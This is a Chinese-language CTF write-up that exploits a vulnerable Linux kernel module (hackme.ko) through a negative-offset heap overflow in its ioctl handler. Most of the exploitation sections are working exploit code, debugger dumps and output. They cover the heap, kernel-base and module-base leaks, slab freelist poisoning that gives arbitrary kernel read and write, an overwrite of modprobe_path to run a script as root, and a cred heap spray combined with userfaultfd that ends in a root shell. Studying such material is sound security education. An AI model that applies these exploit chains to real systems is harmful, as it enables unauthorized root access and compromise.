#### 文件系统

解压文件系统后在`/etc/init.d/rcS`	中发现漏洞内核模块：

```shell
mount -t proc none /proc
mount -t devtmpfs none /dev
mkdir /dev/pts
mount /dev/pts

insmod /home/pwn/hackme.ko
chmod 644 /dev/hackme

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict		# 不允许 读kallsyms


cd /home/pwn
chown -R 1000:1000 .
setsid cttyhack setuidgid 1000 sh

umount /proc
poweroff -f

```

#### 漏洞分析

注册了`ioctl`交互函数`hackme_ioctl`，同Usee space交互的数据是`0x20`大小的结构体

```c
  unsigned int v17; // [rsp+0h] [rbp-38h] BYREF
  __int64 v18; // [rsp+8h] [rbp-30h]
  __int64 v19; // [rsp+10h] [rbp-28h]
  __int64 v20; // [rsp+18h] [rbp-20h]

  copy_from_user(&v17, a3, 0x20LL);             // ioctl交互数据
```

联系下文command操作，该结构体为

```c
  unsigned int idx; // [rsp+0h] [rbp-38h] BYREF
  __int64 user_buffer; // [rsp+8h] [rbp-30h]
  __int64 length; // [rsp+10h] [rbp-28h]
  __int64 kernel_buffer_offset; // [rsp+18h] [rbp-20h]
```

其中定义了4种command操作。

##### Free

```c
  if ( a2 == 0x30001 )
  {
    v13 = 2LL * idx;
    v14 = (void *)pool[v13];
    v15 = &pool[v13];
    if ( v14 )
    {
      kfree(v14);
      *v15 = 0LL;
      return 0LL;
    }
    return -1LL;
  }
```

全局变量pool，每一个`object`占该pool两个idx，其中pool[idx]是heap指针。这里kfree并置NULL。

##### Write

```c
    if ( a2 == 0x30002 )
    {
      v9 = 2LL * idx;
      v10 = pool[v9];
      v11 = &pool[v9];
      if ( v10 && kernel_buffer_offset + length <= (unsigned __int64)v11[1] )
      {
        copy_from_user(kernel_buffer_offset + v10, user_buffer, length);
        return 0LL;
      }
    }
```

这里用到了`pool[idx+1]`，推断其是pool[idx]处heap的大小。

这里将指定长度user_buffer内容复制到kernel_buffer的指定offset。

##### Read

```c
 else if ( a2 == 0x30003 )
    {
      v5 = 2LL * idx;
      v6 = pool[v5];
      v7 = &pool[v5];
      if ( v6 )
      {
        if ( kernel_buffer_offset + length <= (unsigned __int64)v7[1] )
        {
          copy_to_user(user_buffer, kernel_buffer_offset + v6, length);
          return 0LL;
        }
      }
 }
```

这里将kernel_buffer指定的offset、length长度复制到user space。

##### kmalloc

```c
 if ( a2 != 0x30000 )
    return -1LL;
  v12 = length;
  v13 = user_buffer;
  v14 = &pool[2 * idx];
  if ( *v14 )
    return -1LL;
  v18 = _kmalloc(length, 0x6000C0LL);
  if ( !v18 )
    return -1LL;
  *v14 = v18;
  copy_from_user(v18, v13, v12);
  v14[1] = v12;
```

这里构造一个object，并初始化，存储在`pool`中。

漏洞在于：offset字段是无符号整数，意味着offset可以是负数，造成向下溢出。

#### 漏洞利用

对于堆越界造成任意长度读写内存，且系统`KASLR`、`SMEP`、`SMAP`保护全开，模块只开启了`NX`保护。

需要转换为**任意地址读写**来达到提权。

注意这里exp上传到原文件系统需要静态链接编译，否则出现`sh : exp not found`。

##### slab堆管理

内核堆管理`slab`类似于`fastbin`管理机制，空闲堆块链表`LIFO`，且`FD`指向下一个空闲堆块。

如下示例代码

```c
int main()
{
	// init a object and user_buffer to communicate with kernel
	obj = malloc(sizeof(object));
	unsigned char mem[0x1000];
	memset(mem, 0, sizeof(mem));


	open_hackme();

	// leak heap addr
	alloc_object(0, mem, 0x100);
	alloc_object(1, mem, 0x100);
	alloc_object(2, mem, 0x100);
	alloc_object(3, mem, 0x100);
	alloc_object(4, mem, 0x100);

	puts("[*] alloc done!");
	free_object(1);
	free_object(3);

	puts("[*] free done!");
	write_object(0, mem, 0x20, 0x10);

	return 0;
}
```



在`alloc done`时，全局变量pool里堆分布：

```assembly
gdb-peda$ x/10gx $1
0xffffffffc0035400:	0xffff9588c017b500	0x0000000000000100
0xffffffffc0035410:	0xffff9588c017b600	0x0000000000000100
0xffffffffc0035420:	0xffff9588c017b700	0x0000000000000100
0xffffffffc0035430:	0xffff9588c017b800	0x0000000000000100
0xffffffffc0035440:	0xffff9588c017b900	0x0000000000000100
```

堆地址连续，每个堆块0x100大小。

在`free` 1、3堆块后，pool堆分布：

```assembly
gdb-peda$ x/10gx $1
0xffffffffc0035400:	0xffff9588c017b500	0x0000000000000100
0xffffffffc0035410:	0x0000000000000000	0x0000000000000100
0xffffffffc0035420:	0xffff9588c017b700	0x0000000000000100
0xffffffffc0035430:	0x0000000000000000	0x0000000000000100
0xffffffffc0035440:	0xffff9588c017b900	0x0000000000000100
```

其中释放的1、3堆块的关系

```assembly
gdb-peda$ x/4gx 0xffff9588c017b600
0xffff9588c017b600:	0xffff9588c017ba00	0x0000000000000000
0xffff9588c017b610:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/4gx 0xffff9588c017b800
0xffff9588c017b800:	0xffff9588c017b600	0x0000000000000000
0xffff9588c017b810:	0x0000000000000000	0x0000000000000000
```

可以看到释放后的堆块`fd`字段保存了下一个空闲堆块，且符合`FILO`（先进后出）。

##### 堆地址泄漏

基于上面对`slab`堆分布的分析，利用溢出造成的越界读，可以泄漏已经释放堆块的`fd`字段，造成堆地址泄漏。

例如，通过读堆块4，利用offset向下溢出，读已经被释放的堆块3的fd字段，即可泄漏得到堆块1的堆地址。

泄漏代码：

```c
	read_object(4, mem, 0x100, -0x100);
	heap_addr = ((size_t*)mem)[0];
	printf("[*] Leaked heap addr: 0x%lx\n", heap_addr);
```

##### 内核基地址

在已分配的第一个堆块前的内存，是已经被内核使用的内存，其中很有可能存在内核指针值。

```assembly
gdb-peda$ x/10gx 0xffff9bf0c017b500-0x200
0xffff9bf0c017b300:	0xffff9bf0c017b378	0x0000000100000000
0xffff9bf0c017b310:	0x0000000000000001	0x0000000000000000
0xffff9bf0c017b320:	0xffff9bf0c017b378	0xffffffff89849ae0
0xffff9bf0c017b330:	0xffffffff89849ae0	0xffff9bf0c0015100
0xffff9bf0c017b340:	0xffff9bf0c017b358	0x0000000000000000
```

对比`/proc/kallsyms`

```
/home/pwn # cat /proc/kallsyms | grep ffffffff89849ae0
ffffffff89849ae0 d sysctl_table_root
```

如上，第一个堆块向下溢出`0x200`，偏移`0x28`处的地址就是内核符号`sysctl_table_root`的地址。

泄漏代码：

```c
	// leak kernel address
	read_object(0, mem, 0x200, -0x200);
	kernel_addr = ((size_t *) mem)[5] - 0x849ae0;			// sysctl_table_root offset
	printf("[*] Leaked kernel addr: 0x%lx\n", kernel_addr);

```

成功泄漏

```assembly
[*] Leaked kernel addr: 0xffffffffad600000
/home/pwn # more /proc/kallsyms 
ffffffffad600000 T startup_64
```

##### 模块基地址

类似于用户态的`heap attack`，最佳的任意地址写实现就是能够分配得到在hackme模块下`.bss`段的全局变量`pool`，这样交叉的结构使得通过构造`pool`内的object，实现任意地址读写。

首先需要泄漏得到hackme模块的基地址，这一点由于已经泄露了内核基地址，我们只需要利用`fastbin attack`修改`fd`指向内核的某一包含模块地址信息的地址，即可泄漏！

在内核中，`mod_tree`结构包含了模块地址信息。

```
/home/pwn # cat /proc/kallsyms | grep mod_tree
ffffffff8c86df00 t __mod_tree_remove
ffffffff8c86e720 t __mod_tree_insert
ffffffff8d011000 d mod_tree
```

其偏移是`0x811000`。

其内存中有加载的内核模块地址信息：

```assembly
gdb-peda$ x/40gx 0xffffffff8d011000
0xffffffff8d011000:	0x0000000000000006	0xffffffffc01ac320
0xffffffff8d011010:	0xffffffffc01ac338	0xffffffffc01aa000
0xffffffff8d011020:	0xffffffffc01b0000	0x0000000000000000
0xffffffff8d011030:	0x0000000000000000	0x0000000000000000
0xffffffff8d011040:	0xffffffff8d011040	0xffffffff8d011040


hackme 16384 - - Live 0xffffffffc01aa000 (O)
```

可以看到，在mod_tree偏移`0x18`位置存着hackme模块基地址。

因此，利用`fastbin attack`攻击，修改fd为`mod_tree`附近地址（利用向下溢出读，防止修改内核数据）

泄漏代码：

```c
	// alloc to have mod_tree
	memset(mem, 'a', 0x100);
	*(size_t*)mem = (kernel_addr + 0x811000 + 0x50);		// mod_tree + 0x50; avoid overwrite mod_tree
	// fake 3's fd to mod_tree
	write_object(4, mem, 0x100, -0x100);

	// alloc to get mod_tree
	alloc_object(5, mem, 0x100);			
	alloc_object(6, mem, 0x100);

	// leak hackme address
	read_object(6, mem, 0x50, -0x50);						
	hackme_addr = ((size_t*)mem)[3];				// hackme addr
	printf("[*] Leaked hackme addr: 0x%lx\n", hackme_addr);	
```

##### 任意地址写

得到hackme模块基地址后，利用相同的`fastbin attack`修改fd为hackme下的`pool`变量地址。

分配得到pool所在的地址，利用该堆块修改pool内容，实现任意地址读写。

利用代码：

```c
	// alloc hackme's pool
	long pool_addr = hackme_addr + 0x2400;
	free(2);
	free(5);									// origin 3

	*(size_t*)mem = pool_addr + 0x100;
	write_object(4, mem, 0x100, -0x100);		// overwrite origin 3's fd


	alloc_object(7, mem, 0x100);
	alloc_object(8, mem, 0x100);				// pool's addr
```

此时的堆分布：

```c
gdb-peda$ x/20gx $1               
0xffffffffc0136400:	0xffff996ec017b500	0x0000000000000100
0xffffffffc0136410:	0x0000000000000000	0x0000000000000100
0xffffffffc0136420:	0x0000000000000000	0x0000000000000100
0xffffffffc0136430:	0x0000000000000000	0x0000000000000100
0xffffffffc0136440:	0xffff996ec017b900	0x0000000000000100
0xffffffffc0136450:	0x0000000000000000	0x0000000000000100
0xffffffffc0136460:	0xffffffff8f011050	0x0000000000000100
0xffffffffc0136470:	0xffff996ec017b800	0x0000000000000100
0xffffffffc0136480:	0xffffffffc0136500	0x0000000000000100
0xffffffffc0136490:	0x0000000000000000	0x0000000000000000
```

可以看到，pool偏移0x80处的指针内容指向`pool + 0x100`；成功地分配得到了pool所在的地址进入堆块，利用该堆块*p*可以实现任意地址读写。

例如想要读写地址`addr`，只需要利用p将`addr`和`length`写入到pool中去，再利用write \ read指定的idx即可。

##### 权限提升

到目前为止，我们可以利用原漏洞达到任意地址读、写的目的，接下来需要利用这些完成权限提升。

* modprobe_path

  `modprobe`是用于将可加载模块加载\卸载到内核的，该程序的路径保存在内核全局变量`modprobe_path`中，默认是`/sbin/modprobe`，如下

  ```shell
  $ cat /proc/sys/kernel/modprobe 
  /sbin/modprobe
  
  /home/pwn # cat /proc/kallsyms | grep modprobe_path
  ffffffff84c3f960 D modprobe_path
  
  gdb-peda$ x/s 0xffffffff84c3f960
  0xffffffff84c3f960:	"/sbin/modprobe"
  ```

  之所以存在`Overwrite modprobe_path`的提权方式，是由于在Linux上执行一个**未知类型**的文件时，`modprobe_path`指向的路径程序将会被执行(root权限)。

  `execve`调用路径：

  1. [do_execve()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1977)
  2. [do_execveat_common()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1855)
  3. [bprm_execve()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1788)
  4. [exec_binprm()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1740)
  5. [search_binary_handler()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1694)
  6. [request_module()](https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L124)
  7. [call_modprobe()](https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L69)

  最终执行以下代码：

  ```c
  static int call_modprobe(char *module_name, int wait)
  {
      ...
    	argv[0] = modprobe_path;
    	argv[1] = "-q";
    	argv[2] = "--";
    	argv[3] = module_name;
    	argv[4] = NULL;
  
    	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
  					 NULL, free_modprobe_argv, NULL);
      ...
  }
  ```

  `call_usermodehelper`将执行对应的程序，造成提权。

  因此，利用任意地址写，修改`modprobe_path`指向构造的bash文件，在bash文件中构造一个**未知类型文件**，执行该文件，将造成提权。

  

  利用任意地址写修改`modprobe_path`的代码：

  ```c
  /home/pwn # cat /proc/kallsyms | grep modprobe_path
  ffffffffbbe3f960 D modprobe_path
  /home/pwn # more /proc/kallsyms 
  ffffffffbb600000 T startup_64
  
  
  // over write modprobe_path
  long modprobe_path = kernel_addr + 0x83f960;
  
  //fake object
  memset(mem, 0, sizeof(mem));
  *(size_t*)mem = modprobe_path;
  *(size_t*)(mem + 0x8) = 0x20;
  
  write_object(8, mem, 0x10, -0x10);			// pool + 0xf0
  
  puts("[*] fake pool object done!");
  memset(mem, 0, sizeof(mem));
  strcpy(mem, "/tmp/x");
  write_object(0xf0/0x10, mem, 0x10, 0);		// write fake_modprobe
  
  puts("[*] Overwrite modprobe_path done!");
  read_object(0xf0/0x10, mem, 0x10, 0);
  ```

  

  获取root权限代码，利用伪造的bash将flag复制到home目录，并给定权限。

  ```c
  	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/x");
  	system("chmod +x /home/pwn/x");
  
  	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/duck");
  	system("chmod +x  /home/pwn/duck");
  
  	system("/home/pwn/duck");
  ```

  成功提权：

  ```shell
  ~ $ ls
  duck       exp        flag       hackme.ko  x
  ~ $ cat flag 
  *CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}
  
  ```
  
  另外，同`modprobe_path`类似的最终调用`call_usermodehelper`的全局变量还有：
  
  * poweroff_cmd
  
    ```c
    // /kernel/reboot.c
    char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
    // /kernel/reboot.c
    static int run_cmd(const char *cmd)
        argv = argv_split(GFP_KERNEL, cmd, NULL);
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    // /kernel/reboot.c
    static int __orderly_poweroff(bool force)    
        ret = run_cmd(poweroff_cmd);
    ```
  
    触发方式：通过调用`__orderly_poweroff`函数可以触发。
  
* userfaultfd机制提权

  * userfaultfd机制简介

    内核内存一般说包含两个部分：RAM，保存被使用的内存页；交换区，保存暂时闲置的内存页。然而除此之外，有部分内存不属于这两者，例如`mmap`创建的内存映射页。

    mmap映射的地址在`read/write`访问之前并没有真正的创建（映射到实际的物理页）

    ```c
    A： mmap(0x1fff000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);
    B: char* buffer = (char*)0x1fff000;
    C: printf("read: %c\n", buffer[0]);
    ```

    在A执行完后，内核并没有将`fd`内容拷贝到`0x1fff000`。

    在执行C时访问该虚拟地址，触发缺页错误，内核将做：（1）为`0x1fff000`创建物理帧；（2）从fd读取内容到`0x1fff000`；（3）在页表为该内存页建立合适的入口。

    在这整个过程中，可以称作发生了一次缺页错误，将会导致内核切换上下文和中断。

    而`userfaultfd`机制可以用作管理这类缺页错误，允许在用户空间完成对这类错误的处理，也就是一旦在内核触发了一次缺页错误，可以利用用户态程序去执行一些操作。

    

    具体地，该机制允许在多线程程序中指定一个线程处理进程其他线程的user-space的页面。

    通过`userfaultfd`系统调用，返回一个`file descriptor`，通过`ioctl_userfaultfd`操作该`fd`完成`fault`的处理。

    * read/POLLIN通知一个专用的userland的线程轮询和处理`fault`；
    * 通过ioctl，`UFFDIO_*`可以管理注册在userfaultfd里的所有虚拟内存区，允许通过指定的线程处理这个fault，或者管理对应的虚拟地址；同mremap/mprotect相比，userfault的优势在于不会引入高荷载的结构体如`vmas`。

    在用户空间定义`userfault handler`的步骤（示例代码`userfaultdf_demo.c`）

    **Step1：创建一个uffd**

    ```c
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ```

    所有需要监视的内存区域、配置处理模式和最终的缺页处理都是通过`ioctl`对这个`uffd`操作完成的。

    创建一个uffd之后，首先必须需要使用`UFFDIO_API ioctl`启用该uffd（完成user-space和kernel-space握手，确定API版本和支持的功能）

    ```c
    // UFFDIO_API 指针结构体
       struct uffdio_api {
            __u64 api;        /* Requested API version (input) */
            __u64 features;   /* Requested features (input/output) */
            __u64 ioctls;     /* Available ioctl() operations (output) */
        };
    
    // before Linux 4.11
    uffdio_api.features Must be zero.
    // since Linux 4.11; below features enable
        UFFD_FEATURE_EVENT_FORK 
        UFFD_FEATURE_EVENT_REMAP 
        UFFD_FEATURE_EVENT_REMOVE 
        UFFD_FEATURE_EVENT_UNMAP 
        UFFD_FEATURE_MISSING_HUGETLBFS 
        UFFD_FEATURE_MISSING_SHMEM 
        UFFD_FEATURE_SIGBUS 
        
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    ```

    **Step2 注册/注销内存区域**

    通过`UFFDIO_REGISTER`指定注册内存地址区域，在指定区域内发生page fault时，内核将通知user-space。

    ```c
    UFFDIO_REGISTER 			// 注册监视page-fault的内存区域
    UFFDIO_UNREGISTER 			// 注销监视的page-fault内存区域
    //注册结构体
    
    The argp argument is a pointer to a uffdio_register structure,
    defined as:
    
    struct uffdio_range {
        __u64 start;    /* Start of range */
        __u64 len;      /* Length of range (bytes) */
    };
    
    struct uffdio_register {
    	struct uffdio_range range;
        __u64 mode;     /* Desired mode of operation (input) */
        __u64 ioctls;   /* Available ioctl() operations (output) */
    };
    //其中mode 定义了内存区域的操作类型，只能是UFFDIO_REGISTER_MODE_MISSING.
    
    
    /* Create a private anonymous mapping. The memory will be
                  demand-zero paged--that is, not yet allocated. When we
                  actually touch the memory, it will be allocated via
                  the userfaultfd. */
    
    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");
    
    printf("Address returned by mmap() = %p\n", addr);
    
    /* Register the memory range of the mapping we just created for
                  handling by the userfaultfd object. In mode, we request to track
                  missing pages (i.e., pages that have not yet been faulted in). */
    
    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");
    ```

    **Step3 创建一个处理userfaultfd事件的线程**

    该线程需要轮询和处理userfaultfd事件，因此相当于一个死循环

    ```c
           static void *
           fault_handler_thread(void *arg)
           {
               static struct uffd_msg msg;   /* Data read from userfaultfd */
    			...
               struct uffdio_copy uffdio_copy;
               uffd = (long) arg;			// userfaultfd参数
    			...
               /* Loop, handling incoming events on the userfaultfd
                  file descriptor. */
               for (;;) {
                   /* See what poll() tells us about the userfaultfd. */
                   struct pollfd pollfd;
                   int nready;
                   pollfd.fd = uffd;
                   pollfd.events = POLLIN;
                   nready = poll(&pollfd, 1, -1);
             		...
                   /* Read an event from the userfaultfd. */
                   nread = read(uffd, &msg, sizeof(msg));
                   if (nread == 0) {
                       printf("EOF on userfaultfd!\n");
                       exit(EXIT_FAILURE);
                   }
    				....
                   /* We expect only one kind of event; verify that assumption. */
                   if (msg.event != UFFD_EVENT_PAGEFAULT) {
                       fprintf(stderr, "Unexpected event on userfaultfd\n");
                       exit(EXIT_FAILURE);
                   }
    
                   /* Copy the page pointed to by 'page' into the faulting
                      region. Vary the contents that are copied in, so that it
                      is more obvious that each fault is handled separately. */
    			  // UFFDIO_COPY处理PAGE FAULT
                   uffdio_copy.src = (unsigned long) page;
    
                   /* We need to handle page faults in units of pages(!).
                      So, round faulting address down to page boundary. */
    
                   uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                      ~(page_size - 1);
                   uffdio_copy.len = page_size;
                   uffdio_copy.mode = 0;
                   uffdio_copy.copy = 0;
                   if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                       errExit("ioctl-UFFDIO_COPY");
               }
           }
    
    /* Create a thread that will process the userfaultfd events. */
    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    ```

  * 利用userfaultfd机制修改cred

    提权的本质就是修改进程`cred`结构下`uid`和`euid`值为0即可得到root权限。

    而如前所述，我们已经有了`任意地址读写`的条件，所以最便捷的方式就是找到`cred`结构体在内核中的位置，并修改其下的`euid`和`uid`为0。

    cred结构体：

    ```c
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC    0x43736564
    #define CRED_MAGIC_DEAD    0x44656144
    #endif
        kuid_t        uid;        /* real UID of the task */
        kgid_t        gid;        /* real GID of the task */
        kuid_t        suid;        /* saved UID of the task */
        kgid_t        sgid;        /* saved GID of the task */
        kuid_t        euid;        /* effective UID of the task */
        kgid_t        egid;        /* effective GID of the task */
        kuid_t        fsuid;        /* UID for VFS ops */
        kgid_t        fsgid;        /* GID for VFS ops */
        unsigned    securebits;    /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;    /* caps we're permitted */
        kernel_cap_t    cap_effective;    /* caps we can actually use */
        kernel_cap_t    cap_bset;    /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char    jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key    *process_keyring; /* keyring private to this process */
        struct key    *thread_keyring; /* keyring private to this thread */
        struct key    *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;    /* subjective LSM security */
    #endif
        struct user_struct *user;    /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
        struct rcu_head    rcu;        /* RCU deletion hook */
    };
    ```

    如何在内核中找到我们进程的`cred`结构是关键。

    ##### 堆喷

    由于每一个进程都有一个`cred`结构体，且该结构体是由堆分配的，因此如果在操作全局变量pool之前，fork大量的进程，就能够在堆上构造出大量的`cred`结构体，利用越界读搜索当前堆前部分的内存，找到cred结构体，修改`euid`和`uid`值，使得部分进程结构体被修改，提权到root权限。

    在[creds堆喷利用](https://www.anquanke.com/post/id/87225)这篇文章中提到了如何在内核地址空间找到cred位置，cred位于**堆基地址 + 一定偏移量**的位置，而我们能够越界读写也是基于堆地址的，因此，在pool变量维护的堆前的堆区一定存在大量的cred结构体。

    **搜索cred特征**

    `cred`结构体中，`uid`、`gid`、`suid`等8个字段的内容对于不同的用户权限值不同，通过`id`可以获取，在非特权用户中，默认都是1000，并且这些字段是`4`字节对齐的，因此我们只需要找到`uid`的位置，就可以重写这些字段为0，达到提权的目的。

    ```c
    #define MAX_HEAP_AREA 0x160000
    #define SEARCH_SIZE  0x10000
    
    
    
    	alloc_object(0, mem, 0x100);
    	read_object(0, mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
    	unsigned int* unit = (unsigned int*)mem;
    
    	puts("[*] Start to search for creds.");
    	for(i = 0; i < SEARCH_SIZE/4; i++)
    	{
    		if(unit[i] == 1000 & unit[i+1] == 1000 & unit[i+2] == 1000 & unit[i+3] == 1000 & unit[i+4] == 1000 &
    			unit[i+5] == 1000 & unit[i+6] == 1000 & unit[i+7] == 1000)
    		{
    
    			cred_offset = i * 32;						// offset from read kernel start
    			printf("[*] Find cred at offset 0x%lx\n", cred_offset);
    			for(j = 0; j < 8; j++)
    			{
    				// modify uid | euid .. = 0
    				unit[i+j] = 0;
    			}
    			break;
    		}
    	}
    
    	if (cred_offset == -1)
    	{
    		puts("[x] Failed to find creds!\n");
    		exit(-1);
    	}
    ```

    通过不断增加`MAX_HEAP_AREA`值，每次增加一个`SEARCH_SIZE`，向堆前搜索，最终发现当`MAX_HEAP_AREA`为`0x160000`时，能够稳定找到cred结构，因此可以确定`cred`在分配的第一块可利用堆前`0x150000`到`0x160000`之间。

    而当它达到`0x180000`时，越界读将触发`pagefault in non-whitelisted uaccess`错误。

    ```
    MAX_HEAP_AREA = 0x160000
    ~ $ ./exp
    [*] Opened device.
    [*] Creds heap Spray done!
    [*] Start to search for creds.
    [*] Find cred at offset 0xa304
    
    MAX_HEAP_AREA = 0x180000
    ~ $ ./exp
    [*] Opened device.
    [*] Creds heap Spray done!
    [    5.676221] BUG: pagefault on kernel address 0xffff8cfcfff7b500 in non-whitelisted uaccess
    [    5.681390] BUG: unable to handle kernel paging request at ffff8cfcfff7b500
    ```

    **修改cred**

    理论上，在搜索到cred在内核空间和可利用堆之间的距离后，利用越界写将修改后的cred复制到原位置即可提权。

    修改前的cred值

    ```assembly
    gdb-peda$ p 0xffff8fea0017b500-0x160000+0xa304
    $3 = 0xffff8fea00025804
    gdb-peda$ x/8gx $3
    0xffff8fea00025804:	0x000003e8000003e8	0x000003e8000003e8
    0xffff8fea00025814:	0x000003e8000003e8	0x000003e8000003e8
    ```

    修改cred代码：

    ```c
    	// copy the modified mem to kernel
    	write_object(0, mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
    ```

    但是在`write`时又会触发`pagefault in non-whitelisted uaccess`

    ```assembly
    gdb-peda$ x/6gx $1
    0xffffffffc03e8400:	0xffffa2148017b500	0x0000000000000100
    0xffffffffc03e8410:	0x0000000000000000	0x0000000000000000
    
    ~ $ ./exp 
    [*] Opened device.
    [*] Creds heap Spray done!
    [*] Start to search for creds.
    [*] Find cred at offset 0xa304
    [   28.202566] BUG: pagefault on kernel address 0xffffa21480099000 in non-whitelisted uaccess
    ```

    **使用userfaultfd挂起pagefualt**

    userfaultfd可以允许对于指定的内存内发生的pagefault交由用户处理，因此，将cred和发生pagefault地址间的部分注册，即可挂起poagefault，避免kernel panic。

    set up userfaultfd代码

    ```c
    	// set userfaultfd and overwrite cred
    	unsigned long fault_page, fault_page_length;
    	char *new_mem = (char *) mmap(NULL, MAX_HEAP_AREA, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    	memcpy(new_mem, mem, SEARCH_SIZE);
    	fault_page = (uint64_t)new_mem + SEARCH_SIZE;
    	fault_page_length = MAX_HEAP_AREA - SEARCH_SIZE;
    	register_userfault(fault_page, fault_page_length);
    
    	write_object(0, new_mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
    ```

    

    成功提权（一定的几率）

    ```
    ~ $ ./exp 
    [*] Opened device.
    [*] Creds heap Spray done!
    [*] Start to search for creds.
    [*] Find cred at offset 0xa384
    [*] Handler started !
    [*] Get A PageFault.
    [*] Spawn root at process 0 
    /home/pwn # id
    uid=0(root) gid=0 groups=1000
    /home/pwn # whoami
    root
    ```

    

  * 利用userfaultfd机制条件竞争

* 

#### 参考链接

* [Kernel-Pwn从任意地址读写到权限提升](http://p4nda.top/2018/11/07/stringipc/)
* [call_usermodehelper提权变量路径总结](https://www.jianshu.com/p/a2259cd3e79e)
* [userfaultfd机制在Kernel提权中的利用](https://f5.pm/go-71048.html)
* [creds堆喷利用](https://www.anquanke.com/post/id/87225)